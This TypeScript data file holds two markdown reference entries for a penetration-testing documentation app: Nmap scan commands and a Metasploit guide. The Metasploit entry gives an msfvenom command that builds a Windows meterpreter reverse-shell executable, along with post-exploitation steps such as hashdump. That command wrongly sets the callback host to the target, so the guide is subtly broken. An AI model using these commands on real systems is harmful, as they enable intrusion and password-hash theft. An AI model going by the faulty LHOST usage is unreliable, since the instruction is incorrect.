export interface DocFile {
    id: string;
    title: string;
    category: string;
    path: string;
    content: string;
}

export const docsData: DocFile[] = [
    {
        id: 'nmap-recon',
        title: 'Nmap Scanning',
        category: 'Reconnaissance',
        path: 'recon/nmap.md',
        content: `# Nmap Reference\n\nNmap ("Network Mapper") is a free and open source utility for network discovery and security auditing.\n\n## Basic Scans\n\nTo scan your target {target}:\n\n\`\`\`bash\nnmap -sV -sC {target}\n\`\`\`\n\n## Advanced Techniques\n\n- **Stealth Scan**: \`nmap -sS {target}\`\n- **UDP Scan**: \`nmap -sU {target}\`\n- **OS Detection**: \`nmap -O {target}\`\n\n## Practical Examples\n\nWhen attacking {target}, always start with a full port scan:\n\n\`\`\`bash\nnmap -p- -T4 {target}\n\`\`\``
    },
    {
        id: 'msf-exploit',
        title: 'Metasploit Framework',
        category: 'Exploitation',
        path: 'exploitation/metasploit.md',
        content: `# Metasploit Guide\n\nMetasploit is the world's most used penetration testing framework.\n\n## Getting Started\n\n1. Start msfconsole: \`msfconsole\`\n2. Search for exploits: \`search {target}\`\n\n## Reverse Shells\n\nGenerate a payload for {target}:\n\n\`\`\`bash\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={target} LPORT=4444 -f exe > shell.exe\n\`\`\`\n\n## Post Exploitation\n\nOnce you have a session on {target}:\n\n- \`getsystem\`\n- \`hashdump\`\n- \`screenshot\``
    }
];
